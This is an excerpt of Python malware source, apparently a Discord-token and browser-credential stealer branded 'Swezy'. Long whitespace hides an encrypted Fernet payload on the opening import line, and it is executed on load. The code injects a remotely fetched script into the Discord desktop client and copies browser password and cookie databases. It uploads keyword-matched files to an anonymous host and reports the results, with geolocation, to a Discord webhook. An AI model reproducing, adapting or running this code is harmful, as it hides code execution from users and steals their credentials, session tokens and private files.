...
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'iU4wRDyNXI5ZHh_5o5tTTjaQvSStJ7ILy6SJB-YJ_dY=').decrypt(b'gAAAAABlaz5xvaV0NPdvroJYBkbTHH3j3SRwxyPKHqrEfIxUecExKeUTk8ccE54w97LJrHoKYAPtIjo_pJugZouNJhQ1zfOYekl07ek1srsNRtrF1AnISfJ9pCywhZSdrW4n7fZLCI3xSyYeaykXA7zOMZG3taMZDeIJoyWEF6fmnOs6JLoMiSfJYdHasJpbJwAr2d_JvUkRIarLYd22SyrNSsLzw-hH6A=='))
import asyncio
import json
import ntpath
import os
...
__config__ = {
    ...
    'inject_url': "https://raw.githubusercontent.com/RndmAcc123/BallDestroyer69/main/index.js",
    'hide': '%_hide_script%',
    'ping': '%ping_enabled%',
    'pingtype': '%ping_type%',
                            ...
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                ...
                                if ntpath.exists(inj_path):
                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(inj_path + 'update', exist_ok=True)
                                        except PermissionError:
                                            pass
                                    if self.regex_webhook_dsc in self.discord_webhook:
                                        f = httpx.get(self.fetch_conf('inject_url')).text.replace("%WEBHOOK%", self.discord_webhook)#.replace("%num_core_discord%", inj_path + 'index.js')
                                    try:
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['Swezy'] = "https://discord.gg/KkxjCe8Fg2"
    ...
    def finished(self):
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'Swezy <3 | v1.0 | dsc.gg/swezy-dev',
                        'url': 'https://discord.gg/KkxjCe8Fg2',
                        'icon_url': 'https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/blackworld.gif'
                    },
                    'color': 374276,
                    'description': f'[Geolocation]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
...
def getPassw(path, arg):
    ...
    tempfold = temp + "update_chrome6745634" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def grabb_GatherAll():
    ...
    for patt in browserPaths:
        ...
        a.start()
        threadcookies.append(a)

    for thread in threadcookies: thread.join()
...
def Folder_create(pathF, keywords):
    global create_files
    maxfilesperdir = 7
    i = 0
    ...
    for file in listOfFile:
        ...
        i += 1
        if i <= maxfilesperdir:
            url = uploadanonfiles(pathF + "/" + file)
        ...
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadanonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    Folder_create(target, keywords)
                    break
...
def checking():
    ...
    for patt in path2search:
        checking = threading.Thread(target=create_file, args=[patt, key_wordsFiles]);checking.start()
        wikith.append(checking)
    return wikith
